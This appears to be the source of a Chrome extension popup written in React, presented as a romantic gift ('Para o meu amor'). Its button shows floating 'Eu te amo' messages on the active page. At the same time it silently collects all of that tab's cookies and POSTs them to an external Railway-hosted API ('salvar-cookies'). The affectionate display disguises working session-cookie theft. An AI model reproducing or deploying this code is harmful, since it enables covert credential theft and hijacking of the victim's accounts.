import { useState } from 'react';
import './App.css';

interface Cookie {
  name: string;
  value: string;
}

function App() {
  const [_, setCookies] = useState<Cookie[]>([]);

  const onClickAlert = async () => {
    try {
      let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

      if (tab.url) {
        chrome.cookies.getAll({ url: tab.url }, (cookies) => {
          const cookiesString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
          if (chrome.runtime.lastError) {
            console.error(`Erro ao capturar cookies: ${chrome.runtime.lastError.message}`);
          } else {
            setCookies(cookies);
            fetch('https://get-cookies-api-production.up.railway.app/api/salvar-cookies', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ cookies: cookiesString }),
            }).then(response => response.json())
              .then(data => {
                console.log("Resposta do servidor:", data);
              })
              .catch(error => {
                console.error("Erro ao enviar cookies:", error);
              });
          }
        });

        chrome.scripting.executeScript({
          target: { tabId: tab.id! },
          func: () => {
            const messageCount = 30;
            const messageElements: HTMLElement[] = [];

            const createMessage = () => {
              const messageElement = document.createElement('span');
              messageElement.textContent = 'Eu te amo 💗';
              messageElement.style.position = 'fixed';
              messageElement.style.bottom = '0';
              messageElement.style.left = `${Math.random() * 100}vw`;
              messageElement.style.transform = 'translateX(-50%)';
              messageElement.style.fontSize = '24px';
              messageElement.style.color = '#ff69b4';
              messageElement.style.fontWeight = 'bold';
              messageElement.style.zIndex = '10000';
              messageElement.style.pointerEvents = 'none';
              messageElement.style.transition = 'transform 3s ease, opacity 3s ease';
              document.body.appendChild(messageElement);
              messageElements.push(messageElement);

              setTimeout(() => {
                messageElement.style.transform = 'translate(-50%, -100vh)';
                messageElement.style.opacity = '0';
              }, 100);

              setTimeout(() => {
                messageElement.remove();
              }, 3100);
            };

            for (let i = 0; i < messageCount; i++) {
              setTimeout(createMessage, i * 1000);
            }
          }
        });
      } else {
        console.error("URL da aba ativa não encontrada.");
      }
    } catch (error) {
      console.error("Erro ao executar o código:", error);
    }
  };

  return (
    <>
      <h1>Para o meu amor</h1>
      <div className="card">
        <button onClick={onClickAlert}>
          Clique em mim
        </button>
      </div>
      {/* <div className="cookies">
        <h2>Cookies Capturados</h2>
        {cookies.length > 0 ? (
          <ul>
            {cookies.map((cookie, index) => (
              <li key={index}>
                <strong>{cookie.name}:</strong> {cookie.value}
              </li>
            ))}
          </ul>
        ) : (
          <p>Nenhum cookie capturado</p>
        )}
      </div> */}
    </>
  );
}

export default App;
